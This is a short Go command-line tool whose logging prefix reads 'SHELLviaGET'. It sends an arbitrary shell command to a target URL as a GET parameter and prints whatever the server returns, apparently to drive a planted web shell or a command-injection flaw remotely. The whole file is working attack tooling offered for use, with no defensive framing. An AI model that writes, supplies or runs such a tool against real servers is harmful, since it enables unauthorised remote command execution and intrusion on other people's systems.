/*
	Goal:
	- Simplify command execution process via GET request
*/

package main

import (
	"flag"
	"fmt"
	"io/ioutil"
	"log"
	"net/http"
	"net/url"
)

var targetURL string
var param string
var cmd string

func init() {
	// Init logging module
	log.SetPrefix("[SHELLviaGET] ")
	log.SetFlags(log.Ldate | log.Lmicroseconds | log.Llongfile)

	// Parse argument flags
	flag.StringVar(&targetURL, "u", "", "Target URL")
	flag.StringVar(&param, "p", "", "GET parameter")
	flag.StringVar(&cmd, "c", "", "Command to be executed")
	flag.Parse()

	if targetURL == "" {
		flag.PrintDefaults()
		log.Fatal("Target URL not defined")
	}
	if param == "" {
		flag.PrintDefaults()
		log.Fatal("GET param not defined")
	}
	if cmd == "" {
		flag.PrintDefaults()
		log.Fatal("Command not defined")
	}

	// Validate URL correctness
	_, err := url.Parse(targetURL)
	if err != nil {
		flag.PrintDefaults()
		log.Fatal(err.Error())
	}
}

func main() {
	resp, err := http.Get(targetURL + "?" + param + "=" + url.QueryEscape(cmd))
	if err != nil {
		fmt.Println(err)
	}

	defer resp.Body.Close()

	if resp.StatusCode == http.StatusOK {
		bodyBytes, err := ioutil.ReadAll(resp.Body)
		if err != nil {
			panic(err)
		}
		bodyString := string(bodyBytes)
		fmt.Println(bodyString)
	} else {
		fmt.Printf("URL returned %d\n", resp.StatusCode)
	}
}
